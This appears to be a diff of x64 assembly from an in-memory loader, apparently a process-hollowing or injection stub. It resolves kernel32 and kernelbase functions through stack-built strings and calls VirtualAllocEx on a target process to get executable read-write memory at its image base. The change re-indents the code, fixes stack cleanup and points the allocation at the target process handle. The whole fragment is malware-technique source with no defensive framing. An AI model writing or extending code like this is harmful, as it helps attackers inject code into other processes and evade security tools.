@@ -364,63 +364,56 @@ section .deccode
 	mov rdx, [lpPebImageBase]
 	call rax
 	
-	
-	
-	
-	
 	lpAllocatedBase:
-	
-	
-	
-	
-	
-	
-	
-	call Locate_kernel32
-	call LoadLibrary
-	mov rbx,rcx
-	loadKernelbase:
-		; Load kernelbase.dll
-		mov rax, "se.dll"     
-		push rax
-		mov rax, "kernelba"
-		push rax
-		mov rcx, rsp
-		sub rsp, 0x30
-		call rsi
-		mov r15,rax
-		add rsp, 0x30
-		add rsp, 0x10
+		call Locate_kernel32
+		call LoadLibrary
+		mov rbx,rcx
+		
+		loadKernelbase:
+			; Load kernelbase.dll
+			mov rax, "se.dll"     
+			push rax
+			mov rax, "kernelba"
+			push rax
+			mov rcx, rsp
+			sub rsp, 0x30
+			call rsi
+			mov r15,rax
+			add rsp, 0x30
+			add rsp, 0x10
 
 
-	call Locate_kernel32
-	VirtualAllocEx:
-		;Lookup VirtualAllocEx
-		mov rax, "llocEx"
-		push rax
-		mov rax, "VirtualA"
-		push rax
-		lea rdx, [rsp]
-		mov rcx, r8
-		sub rsp, 0x30
-		call r14
-		mov r12, rax
+		call Locate_kernel32
+		VirtualAllocEx:
+			;Lookup VirtualAllocEx
+			mov rax, "llocEx"
+			push rax
+			mov rax, "VirtualA"
+			push rax
+			lea rdx, [rsp]
+			mov rcx, r8
+			sub rsp, 0x30
+			call r14
+			add rsp, 0x30
+			add rsp, 0x10
+			mov r12, rax
+			
 
-		mov r15, rbx
-		;call VirtualAllocEx
-		xor rcx,rcx
-		xor rbx,rbx
-		xor rdx,rdx
-		mov rdx, 0x400000
-		mov r8d, [GetSizeTarget]
-		mov r9d, 0x3000
-		mov [rsp+0x20], dword 0x40
-		mov rcx, r13
-		mov rdi, r13
-		call r12
-		mov rbx, r15
-		mov [allocex],rax
-                               
+			mov r15, rbx
+			;call VirtualAllocEx
+			xor rcx,rcx
+			xor rbx,rbx
+			xor rdx,rdx
+			mov rdx, 0x400000
+			mov r8d, [GetSizeTarget]
+			mov r9d, 0x3000
+			mov [rsp+0x20], dword 0x40
+			mov rcx, [ProcInfo+PROCESSINFO.hProcess]
+			mov rdi, r13
+			call r12
+			mov rbx, r15
+			mov [allocex],rax
+								   
                                 
 	call Locate_kernel32 
 	mov rbp,rbx
